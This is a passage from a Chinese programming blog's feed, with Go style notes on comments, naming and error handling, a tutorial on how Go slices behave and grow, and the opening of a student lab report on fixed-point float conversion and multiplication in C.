fmt</code>，它以包为处理对象而非源文件）将 Go程序按照标准风格缩进、 对齐，保留注释并在需要时重新格式化。</p><h3 id="注释">注释</h3><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lk4yl1lmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-lk4yl1lmrh9u64"><pre><code class="hljs go">Good code has lots of comments, bad code requires lots of comments好的代码有很多注释，坏代码需要很多注释          ---Dave Thomas and Andrew Hunt</code></pre></div></div><ul><li><p>注释需要解释代码实现的原因。</p><p>适合解释代码的外部因素</p><p>提供额外上下文</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-vjgfoelmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-vjgfoelmrh9u64"><pre><code class="hljs go"><span class="hljs-keyword">switch</span> resp.StatusCode {<span class="hljs-comment">// ...</span><span class="hljs-keyword">case</span> <span class="hljs-number">307</span>, <span class="hljs-number">308</span>:redirectMethod = reqMethod shouldRedirect = <span class="hljs-literal">true</span> includeBody = <span class="hljs-literal">true</span> <span class="hljs-keyword">if</span> ireq.GetBody == <span class="hljs-literal">nil</span> &amp;&amp; ireq.outgoingLength() != <span class="hljs-number">0</span> {  <span class="hljs-comment">// We had a request body, and 307/308 require</span>  <span class="hljs-comment">// re-sending it, but GetBody is not defined. So just</span>  <span class="hljs-comment">// return this response to the user instead of an</span>  <span class="hljs-comment">// error, like we did in Go 1.7 and earlier.</span>  shouldRedirect = <span class="hljs-literal">false</span> }}</code></pre></div></div></li><li><p><strong>注释应该解释代码什么情况会出错</strong></p><p>在调用方在使用这个方法的时候，可能它不需要实际的去特别细究里面的代码，d但是注释有必要提供需要注意的点，在用户或者自己使用的时候，如果是注意到相关这些点的话，它就能够更正确的来处理相关的一些结果。</p></li><li><p>公共符号始终要注释。对于公共符号都需要有注释说明</p></li><li><p>注释最好是<strong>完整的句子</strong>，这样它才能适应各种自动化的展示。</p><p>第一句应当以<strong>被声明的东西开头</strong>，并且是<strong>单句的摘要</strong>。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-7v8zw9lmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-7v8zw9lmrh9u64"><pre><code class="hljs go"><span class="hljs-comment">// Compile parses a regular expression and returns, if successful,</span><span class="hljs-comment">// a Regexp that can be used to match against text.</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Compile</span><span class="hljs-params">(str <span class="hljs-type">string</span>)</span></span> (*Regexp, <span class="hljs-type">error</span>) {</code></pre></div></div><p>若注释总是以名称开头，<code>go doc</code> 命令的输出就能通过<strong>grep</strong> 变得更加有用。假如你记不住 Compile这个名称，而又在找正则表达式的解析函数（”解析”意味着关键词为parse），那就可以运行</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-z9j0jhlmrh9u64"></i><span>shell</span><div class="collapse show" id="collapse-z9j0jhlmrh9u64"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">go doc -all regexp | grep -i parse</span></code></pre></div></div><p>快速查找。</p></li></ul><h3 id="命名">命名</h3><h4 id="变量">变量</h4><p>Go约定使用驼峰命名，而不是下划线。其他一些通用的命名原则：</p><ul><li>简洁胜于冗长</li><li>缩略词全大写，但当其位于变量开头且不需要导出时，使用全小写<ul><li>例如使用 <code>ServeHTTP</code> 而不是 <code>ServeHttp</code></li><li>使用 <code>XMLHTTPRequest</code> 或者<code>xmlHTTPRequest</code></li></ul></li><li>变量距离其被使用的地方越远，则需要携带越多的上下文信息。全局变量在其名字中需要更多的上下文信息，使得在不同地方可以轻易辨认出其含义</li></ul><h4 id="接口">接口</h4><p>按照约定，<strong>只包含一个方法的接口</strong>应当以该方法的名称加上<code>-er</code> 后缀来命名，如<code>Reader</code>、<code>Writer</code>、<code>Formatter</code>、<code>CloseNotifier</code>等。</p><p>诸如此类的命名有很多，遵循它们及其代表的函数名会让事情变得简单。Read、Write、Close、Flush、String等都具有典型的签名和意义。为避免冲突，请不要用这些名称为你的方法命名，除非你明确知道它们的签名和意义相同。反之，若你的类型实现了的方法，<strong>与一个众所周知的类型的方法拥有相同的含义，那就使用相同的命名</strong>。请将字符串转换方法命名为<code>String</code> 而非 <code>ToString</code>。</p><h4 id="函数">函数</h4><ul><li>函数名不携带包名的上下文信息，因为包名和函数名总是成对出现的</li><li>函数名尽量简短</li><li>当名为 foo 的包某个函数返回类型 Foo时，可以省略类型信息而不导致歧义</li><li>当名为 foo 的包某个函数返回类型 T 时（T 并不是Foo），可以在函数名中加入类型信息</li></ul><h4 id="包名">包名</h4><ul><li>只由小写字母组成。不包含大写字母和下划线等字符</li><li>简短并包含一定的上下文信息。例如 schema、task 等</li><li>不要与标准库同名。例如不要使用 sync 或者 strings</li></ul><p>一个约定就是<strong>包名应为其源码目录的基本名称</strong>。在<code>src/pkg/encoding/base64</code> 中的包应作为<code>"encoding/base64"</code> 导入，其包名应为<code>base64</code>，而非 <code>encoding_base64</code> 或<code>encodingBase64</code>。</p><p>包的导入者可通过包名来引用其内容，因此包中的可导出名称可以此来避免冲突。（请勿使用<code>import .</code>记法，它可以简化必须在被测试包外运行的测试，除此之外应尽量避免使用。这个原则在其他语言中也是通用的。）例如，<code>bufio</code>包中的缓存读取器类型叫做 <code>Reader</code> 而非<code>BufReader</code>，因为用户将它看做<code>bufio.Reader</code>，这是个清楚而简洁的名称。此外，由于被导入的项总是通过它们的包名来确定，因此<code>bufio.Reader</code> 不会与 <code>io.Reader</code>发生冲突。同样，用于创建 <code>ring.Ring</code> 的新实例的函数（这就是Go 中的构造函数）一般会称之为 <code>NewRing</code>，但由于 Ring是该包所导出的唯一类型，且该包也叫 ring，因此它可以只叫做<code>New</code>，它跟在包的后面，就像<code>ring.New</code>。使用包结构可以帮助你选择好的名称。</p><p>另一个简短的例子是 <code>once.Do</code>，<code>once.Do(setup)</code>表述足够清晰，使用 <code>once.DoOrWaitUntilDone(setup)</code>完全就是画蛇添足。<strong>长命名并不会使其更具可读性。一份有用的说明文档通常比额外的长名更有价值</strong>。</p><h3 id="控制流程">控制流程</h3><p>关于控制流程，和其他语言类似，避免嵌套，保持正常流程清晰。遵循线性原理，处理逻辑尽量走直线，避免复杂的嵌套分支。正常流程代码沿着屏幕向下移动先处理异常情况并return掉是个好习惯，可以减少嵌套的同时提高对异常处理的意识，后续产生可能出现的新的异常时也便于修改。</p><h3 id="错误与异常处理">错误与异常处理</h3><p>在工程实践中，错误和异常处理大概是最重要的部分。Go语言的异常处理和其他主流编程语言风格相差较大，既有<code>defer</code>这种优雅的压栈处理回调行为，以便正确管理资源的支持，也有喜闻乐见的<code>if err!=nil</code>。下面对Golang的错误处理进行更深入的认识。</p><h4 id="简单错误">简单错误</h4><p>简单错误指仅出现一次的错误，且在其他地方不需要捕获该错误</p><p>优先使用 errors.New 创建匿名变量来直接表示简单错误</p><p>如果有格式化的需求，使用<code>fmt.Error</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ctbse9lmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-ctbse9lmrh9u64"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">defaultCheckRedirect</span><span class="hljs-params">(req *Request, via []*Request)</span></span> <span class="hljs-type">error</span> {<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(via) &gt;= <span class="hljs-number">10</span> {<span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">"stopped after 10 redirects"</span>)}<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>}</code></pre></div></div><h4 id="错误的-wrap-和-unwrap">错误的 Wrap 和 Unwrap</h4><p>将一个 error 嵌套进另一个 error 中，从而生成一个 error 的跟踪链</p><p>从 Go1.13 后，可以在 <code>fmt.Errorf</code> 中使用 <code>%w</code>关键字来将一个错误 wrap 至其错误链中</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ccngeplmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-ccngeplmrh9u64"><pre><code class="hljs go">list, _, err := c.GetBytes(cache.Subkey(a.actionID, <span class="hljs-string">"srcfiles"</span>))<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">"reading srcfiles list: %w"</span>, err)}</code></pre></div></div><h4 id="错误判定">错误判定</h4><ul><li>使用 <code>errors.Is</code>可以判定错误链上的所有错误是否含有特定的错误</li></ul><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-tvufk9lmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-tvufk9lmrh9u64"><pre><code class="hljs go">data, err = lockedfile.Read(targ)<span class="hljs-keyword">if</span> errors.Is(err, fs.ErrNotExist) {<span class="hljs-comment">// Treat non-existent as empty, to bootstrap the "latest" file</span><span class="hljs-comment">// the first time we connect to a given database.</span><span class="hljs-keyword">return</span> []<span class="hljs-type">byte</span>{}, <span class="hljs-literal">nil</span>}</code></pre></div></div><ul><li>在错误链上获取特定种类的错误，使用 <code>errors.As</code></li></ul><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-omql07lmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-omql07lmrh9u64"><pre><code class="hljs go"><span class="hljs-keyword">if</span> _, err := os.Open(<span class="hljs-string">"non-existing"</span>); err != <span class="hljs-literal">nil</span> {<span class="hljs-keyword">var</span> pathError *fs.PathError<span class="hljs-keyword">if</span> errors.As(err, &amp;pathError) {fmt.Println(<span class="hljs-string">"Failed at path:"</span>, pathError.Path)} <span class="hljs-keyword">else</span> {fmt.Println(err)}}</code></pre></div></div><h4 id="panic">panic</h4><ul><li>不建议在业务代码中使用panic，若问题可以被屏蔽或解决，最好就是让程序继续运行而不是终止整个程序。</li><li>如果当前 goroutine 中所有 deferred 函数都不包含 recover就会造成整个程序崩溃</li><li>当程序启动阶段发生不可逆转的错误时，可以在 init 或 main 函数中使用panic</li></ul><h4 id="recover">recover</h4><ul><li>recover 只能在被 defer 的函数中使用，嵌套无法生效，只在当前goroutine 生效</li><li>如果需要更多的上下文信息，可以 recover 后在 log中记录当前的调用栈。</li></ul><h3 id="总结">总结</h3><p>上述内容仅是个人结合最近的学习内容和EffectiveGo总结出的自己认为较重要的部分记录，以便回顾和提醒。深入掌握一门语言还是要靠阅读第一手材料和动手实践。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go 语言入门指南：slice使用解析</title>
    <link href="/posts/29701/"/>
    <url>/posts/29701/</url>
    
    <content type="html"><![CDATA[<h1 id="go-语言入门指南slice使用解析">Go语言入门指南：slice使用解析</h1><p>在讲slice使用之前，先来看一下切片的结构,理解slice的底层存储对得心应手的使用slice来说是必须的。切片的数据结构是一个结构体,结构体内有三个参数, pointer指向底层数组中的某个元素, length表示长度,cap表示最大容量。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2juceklmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-2juceklmrh9u64"><pre><code class="hljs go"><span class="hljs-keyword">type</span> slice <span class="hljs-keyword">struct</span> {    array unsafe.Pointer  <span class="hljs-comment">//底层数组</span>    <span class="hljs-built_in">len</span>   <span class="hljs-type">int</span>   <span class="hljs-comment">//长度</span>    <span class="hljs-built_in">cap</span>   <span class="hljs-type">int</span>   <span class="hljs-comment">//容量</span>}</code></pre></div></div><p>此部分源码位于<a href="https://go.dev/src/runtime/slice.go"><code>src/runtime/slice.go</code></a>。</p><h3 id="空切片和nil切片">空切片和nil切片</h3><p>在开发中我们会经常遇到这种情况, 我们想返回长度为零的切片时,有时返回的是nil, 有时返回的是空切片, 这两者有什么区别呢,我们到底应该使用哪一种呢。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-qzd7wulmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-qzd7wulmrh9u64"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {    <span class="hljs-comment">// 定义nil切片</span>    <span class="hljs-keyword">var</span> s1 []<span class="hljs-type">string</span>    <span class="hljs-comment">//定义空切片</span>    s2 := <span class="hljs-built_in">make</span>([]<span class="hljs-type">string</span>, <span class="hljs-number">0</span>)    s3 := []<span class="hljs-type">string</span>{}    fmt.Printf(<span class="hljs-string">"%#v,Len:%d,cap:%d,ptr:%p,nil=%t\n"</span>, s1, <span class="hljs-built_in">len</span>(s1), <span class="hljs-built_in">cap</span>(s1), s1, <span class="hljs-literal">nil</span> == s1)    fmt.Printf(<span class="hljs-string">"%#v,Len:%d,cap:%d,ptr:%p,nil=%t\n"</span>, s2, <span class="hljs-built_in">len</span>(s2), <span class="hljs-built_in">cap</span>(s2), s2, <span class="hljs-literal">nil</span> == s2)    fmt.Printf(<span class="hljs-string">"%#v,Len:%d,cap:%d,ptr:%p,nil=%t\n"</span>, s3, <span class="hljs-built_in">len</span>(s3), <span class="hljs-built_in">cap</span>(s3), s3, <span class="hljs-literal">nil</span> == s3)}</code></pre></div></div><p>打印结果：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-u62v1slmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-u62v1slmrh9u64"><pre><code class="hljs go">[]<span class="hljs-type">string</span>(<span class="hljs-literal">nil</span>),Len:<span class="hljs-number">0</span>,<span class="hljs-built_in">cap</span>:<span class="hljs-number">0</span>,ptr:<span class="hljs-number">0x0</span>,<span class="hljs-literal">nil</span>=<span class="hljs-literal">true</span>[]<span class="hljs-type">string</span>{},Len:<span class="hljs-number">0</span>,<span class="hljs-built_in">cap</span>:<span class="hljs-number">0</span>,ptr:<span class="hljs-number">0x10438c108</span>,<span class="hljs-literal">nil</span>=<span class="hljs-literal">false</span>[]<span class="hljs-type">string</span>{},Len:<span class="hljs-number">0</span>,<span class="hljs-built_in">cap</span>:<span class="hljs-number">0</span>,ptr:<span class="hljs-number">0x10438c108</span>,<span class="hljs-literal">nil</span>=<span class="hljs-literal">false</span></code></pre></div></div><p>现在分别打印这三个切片, 可以发现长度容量相同且都为零,那两者有什么不同呢。</p><p>第一点切片的指针指向不同。<code>nil</code>切片通过<code>var</code>关键词定义,仅声明未初始化<code>pointer</code>指针为<code>nil</code>空指针,空切片通过<code>make</code>关键词定义声明并初始化了空间,由于初始化的长度为零, <code>pointer</code>指针指向了空结构体的地址,还未指向底层数组。</p><p>第二点是否等于<code>nil</code>。这个是显然的。但这也说明判断一个切片是否为空时,我们应该通过长度是否为零来判断, 而不是通过是否为nil而来判断。</p><p>第三点, 转码<code>json</code>后不同。对切片进行<code>json</code>编码,<code>nil</code>切片会被编码成当空,切片会被编码成空数组。这一点在前后端交互时值得注意。</p><p><code>make</code>参数第一个是数据类型，第二个是 len ，第三个是 cap。如果不传入第三个参数，则 <code>cap=len</code>。</p><h3 id="slice传递">slice传递</h3><p>下面看一段代码：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-879a92lmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-879a92lmrh9u64"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<span class="hljs-keyword">var</span> s []<span class="hljs-type">int</span><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++ {s = <span class="hljs-built_in">append</span>(s, i)}modifySlice(s)fmt.Println(s)}</code></pre></div></div><p>一眼就能看出来，肯定是打印[1024,1,2,2048]吧。其实不是，运行这段代码后只会打印出[1024,1,2]。原因就是slice是按值传递的，这里传递的是s底层的数组的指针。</p><p>但是仅仅是共享了slice底层的数组，slice底层的<code>len</code>和<code>cap</code>都是被复制了一份，所以在<code>modifySlice</code>里面的<code>len+1</code>在外层是看不到的。外层的<code>len</code>还是3。</p><p>更进一步，如果我们再append一条数据会怎么样呢？</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-020t53lmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-020t53lmrh9u64"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">modifySlice</span><span class="hljs-params">(s []<span class="hljs-type">int</span>)</span></span> {s = <span class="hljs-built_in">append</span>(s, <span class="hljs-number">2048</span>)s = <span class="hljs-built_in">append</span>(s, <span class="hljs-number">4096</span>)s[<span class="hljs-number">0</span>] = <span class="hljs-number">1024</span>}</code></pre></div></div><p>我们可以看到外层打印的slice变成了<strong>[0,1,2]</strong>。因为modifySlice函数内的slice底层的数组发生了扩容，变成了另一个扩容后的结构体，但是外层的slice还是引用的老的结构体。</p><p>由此我们得出： slice 还有array 都按值传递的(传递的时候会复制内存)，golang里所有数据都是按值传递的，指针也是值的一种</p><p>如果没有发生扩容，修改在原来的底层数组内存中</p><p>如果发生了扩容，修改会在新的内存中</p><p>显然，这会发生我们意料之外的行为。因此我们应当使用指针传递作为函数的参数，这与C语言类似。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ablh9hlmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-ablh9hlmrh9u64"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">modifySlice2</span><span class="hljs-params">(s *[]<span class="hljs-type">int</span>)</span></span> {*s = <span class="hljs-built_in">append</span>(*s, <span class="hljs-number">2048</span>)(*s)[<span class="hljs-number">0</span>] = <span class="hljs-number">1024</span>}</code></pre></div></div><p>相应的，调用方式为<code>modifySlice(&amp;s)</code>。</p><h3 id="扩容策略">扩容策略</h3><p>当一次向slice中添加大于原slice容量两倍的元素时，直接将新长度作为容量。否则，</p><p>1.当cap &lt; 256 的时候 slice 每次扩容 * 2。</p><p>2.当cap &gt;= 256 的时候， slice每次扩容 * 1.25。</p><p>我们可以查看<a href="https://go.dev/src/runtime/slice.go">源码</a>中<code>growslice</code>的实现具体分析，这里摘录其核心部分：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-d8altxlmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-d8altxlmrh9u64"><pre><code class="hljs go"><span class="hljs-comment">//num = number of elements being added</span><span class="hljs-comment">//newLen = current length (= oldLen + num)</span>oldLen := newLen - numnewcap := oldCapdoublecap := newcap + newcap<span class="hljs-keyword">if</span> newLen &gt; doublecap {newcap = newLen} <span class="hljs-keyword">else</span> {<span class="hljs-keyword">const</span> threshold = <span class="hljs-number">256</span><span class="hljs-keyword">if</span> oldCap &lt; threshold {newcap = doublecap} <span class="hljs-keyword">else</span> {<span class="hljs-comment">// Check 0 &lt; newcap to detect overflow</span><span class="hljs-comment">// and prevent an infinite loop.</span><span class="hljs-keyword">for</span> <span class="hljs-number">0</span> &lt; newcap &amp;&amp; newcap &lt; newLen {<span class="hljs-comment">// Transition from growing 2x for small slices</span><span class="hljs-comment">// to growing 1.25x for large slices. This formula</span><span class="hljs-comment">// gives a smooth-ish transition between the two.</span>newcap += (newcap + <span class="hljs-number">3</span>*threshold) / <span class="hljs-number">4</span>}<span class="hljs-comment">// Set newcap to the requested cap when</span><span class="hljs-comment">// the newcap calculation overflowed.</span><span class="hljs-keyword">if</span> newcap &lt;= <span class="hljs-number">0</span> {newcap = newLen}}}</code></pre></div></div><p>在<code>make</code>slice时预先分配内存可以提升性能，避免重复的扩容导致性能损失。</p><h3 id="切片操作">切片操作</h3><h4 id="原理">原理</h4><p>切片操作并不复制切片指向的元素，创建一个新的切片会复用原来切片的底层数组，因此切片操作是非常高效的。</p><p>看下面的例子：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-h1ymj4lmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-h1ymj4lmrh9u64"><pre><code class="hljs go">nums := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>)nums = <span class="hljs-built_in">append</span>(nums, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>)nums2 := nums[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>]printLenCap(nums)  <span class="hljs-comment">// len: 5, cap: 8 [1 2 3 4 5]</span>printLenCap(nums2) <span class="hljs-comment">// len: 2, cap: 6 [3 4]</span>nums2 = <span class="hljs-built_in">append</span>(nums2, <span class="hljs-number">50</span>, <span class="hljs-number">60</span>)printLenCap(nums)  <span class="hljs-comment">// len: 5, cap: 8 [1 2 3 4 50]</span>printLenCap(nums2) <span class="hljs-comment">// len: 4, cap: 6 [3 4 50 60]</span></code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Go%20%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%EF%BC%9Aslice%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90/20230828210826094432_897_20230821221521427663_524_slice.jpg" alt="slice"><figcaption aria-hidden="true">slice</figcaption></figure><ul><li>nums2 执行了一个切片操作 <code>[2, 4)</code>，此时 nums 和 nums2指向的是同一个数组。</li><li>nums2 增加 2 个元素 50 和 60 后，将底层数组下标 [4] 的值改为了50，下标[5] 的值置为 60。</li><li>因为 nums 和 nums2 指向的是同一个数组，因此 nums 被修改为 [1, 2, 3,4, 50]。</li></ul><h4 id="性能陷阱">性能陷阱</h4><p>切片的底层是数组，因此在某处插入元素或删除元素意味着后面的元素需要逐个向后或向前移位。每次删除的复杂度为O(N)，因此切片不合适大量随机删除的场景，这种场景下适合使用链表。</p><p>另外在<code>slice传递</code>一节中提到，在已有切片的基础上进行切片，不会创建新的底层数组。因为原来的底层数组没有发生变化，内存会一直占用，直到没有变量引用该数组。因此很可能出现这么一种情况，原切片由大量的元素构成，但是我们在原切片的基础上切片，虽然只使用了很小一段，但底层数组在内存中仍然占据了大量空间，得不到释放。比较推荐的做法是使用<code>copy</code> 替代 <code>re-slice</code>。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-16bvielmrh9u64"></i><span>go</span><div class="collapse show" id="collapse-16bvielmrh9u64"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">lastNumsBySlice</span><span class="hljs-params">(origin []<span class="hljs-type">int</span>)</span></span> []<span class="hljs-type">int</span> {<span class="hljs-keyword">return</span> origin[<span class="hljs-built_in">len</span>(origin)<span class="hljs-number">-2</span>:]}<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">lastNumsByCopy</span><span class="hljs-params">(origin []<span class="hljs-type">int</span>)</span></span> []<span class="hljs-type">int</span> {result := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">2</span>)<span class="hljs-built_in">copy</span>(result, origin[<span class="hljs-built_in">len</span>(origin)<span class="hljs-number">-2</span>:])<span class="hljs-keyword">return</span> result}</code></pre></div></div><h3 id="总结">总结</h3><p>相比C++和Java中的线性容器，golang的切片使用起来更加灵活，但使用时也有更多需要注意的地方。同时，很多常见的数据结构需要我们自己去定义封装，而不像其他语言一样语法层面或标准库层面做了很多实现和封装。关于这一方面的知识会在后续的文章中继续分享。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>南京大学ics2019_PA5</title>
    <link href="/posts/27788/"/>
    <url>/posts/27788/</url>
    
    <content type="html"><![CDATA[<h1 id="pa5实验报告">PA5实验报告</h1><p>2013599 田佳业</p><h2 id="实现浮点指令">实现浮点指令</h2><p>先看一下目前进入战斗场面是什么情况。这里有一个问题是怎么进入战斗场面。因为现在仙剑奇侠传跑的比较慢，这一步都费了挺长时间(笑)</p><p>首先进入主界面选旧的回忆，读最后一个档(倒数第二个档试过没有怪)，进去走迷宫，上下左右移动，走一会儿遇到怪物，自动进入战斗场景。往右下角走会快一些。<del>怪物画的好涩</del></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA5/20230828210311800040_251_20230601235912474020_401_image-20230601104023742.png" alt="image-20230601104023742"><figcaption aria-hidden="true">image-20230601104023742</figcaption></figure><p>按照指导书，修改<code>navy-apps/apps/pal/src/FLOAT/FLOAT.c</code>和对应的头文件。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA5/20230828210313128796_270_20230601235917144417_751_image-20230601111018328.png" alt="image-20230601111018328"><figcaption aria-hidden="true">image-20230601111018328</figcaption></figure><p>根据讲义:</p><blockquote><p>我们先来说明如何用一个32位整数来表示一个实数. 为了方便叙述,我们称用binary scaling方法表示的实数的类型为<code>FLOAT</code>.我们约定最高位为符号位, 接下来的15位表示整数部分, 低16位表示小数部分,即约定小数点在第15和第16位之间(从第0位开始). 从这个约定可以看到,<code>FLOAT</code>类型其实是实数的一种定点表示.</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-b5wzvflmrh9u68"></i><span>asciidoc</span><div class="collapse show" id="collapse-b5wzvflmrh9u68"><pre><code class="hljs asciidoc"><span class="hljs-section">31  30                  16                    0</span><span class="hljs-section">+----+-------------------+--------------------+</span><span class="hljs-section">|sign|      integer      |      fraction      |</span><span class="hljs-section">+----+-------------------+--------------------+</span></code></pre></div></div></blockquote><p>相应的，IEEE754的标准，<a href="https://blog.csdn.net/gao_zhennan/article/details/120717424">图源</a></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA5/20230828210314320862_982_20230601235920917333_702_image-20230601112028613.png" alt="image-20230601112028613"><figcaption aria-hidden="true">image-20230601112028613</figcaption></figure><p>这一部分有点像CSAPP的DataLab，但是由于使用定点表示实数的场景越来越少，这一部分实际价值也并不大。可以看到后面版本的PA已经将这一部分去除。</p><h3 id="浮点转定点">浮点转定点</h3><p>先考虑浮点转定点。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA5/20230828210315373336_905_20230601235924396067_218_image-20230601153308456.png" alt="image-20230601153308456"><figcaption aria-hidden="true">image-20230601153308456</figcaption></figure><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-17hvt5lmrh9u68"></i><span>C</span><div class="collapse show" id="collapse-17hvt5lmrh9u68"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> FLOAT;FLOAT <span class="hljs-title function_">f2F</span><span class="hljs-params">(<span class="hljs-type">float</span> a)</span> {  <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">float_</span> {</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>      <span class="hljs-type">uint32_t</span> m : <span class="hljs-number">23</span>;      <span class="hljs-type">uint32_t</span> e : <span class="hljs-number">8</span>;      <span class="hljs-type">uint32_t</span> signal : <span class="hljs-number">1</span>;    };    <span class="hljs-type">uint32_t</span> value;  };  <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">float_</span> <span class="hljs-title">f</span>;</span>  f.value = *((<span class="hljs-type">uint32_t</span>*)(<span class="hljs-type">void</span>*)&amp;a);  <span class="hljs-type">int</span> e = f.e - <span class="hljs-number">127</span>;  FLOAT result;  <span class="hljs-keyword">if</span> (e &lt;= <span class="hljs-number">7</span>) {    result = (f.m | (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">23</span>)) &gt;&gt; <span class="hljs-number">7</span> - e;  }  <span class="hljs-keyword">else</span> {    result = (f.m | (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">23</span>)) &lt;&lt; (e - <span class="hljs-number">7</span>);  }  <span class="hljs-keyword">return</span> f.signal == <span class="hljs-number">0</span> ? result : (result|(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>));}</code></pre></div></div><h3 id="浮点乘除">浮点乘除</h3><h4 id="乘法">乘法</h4><p>整数部分和小数部分分别相乘，进位。关于舍入处理，这里是采用的“0舍1入”的模式。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-dxm9gilmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-dxm9gilmrh9u68"><pre><code class="hljs C++"><span class="hljs-function">FLOAT <span class="hljs-title">F_mul_F</span><span class="hljs-params">(FLOAT a, FLOAT b)</span> </span>{  <span class="hljs-type">int</span> sign = (a ^ b) &gt;&gt; <span class="hljs-number">31</span>;  <span class="hljs-comment">// 计算符号位</span>  <span class="hljs-comment">// 将a和b的符号位清零</span>  a = a &amp; <span class="hljs-number">0x7FFFFFFF</span>;  b = b &amp; <span class="hljs-number">0x7FFFFFFF</span>;  <span 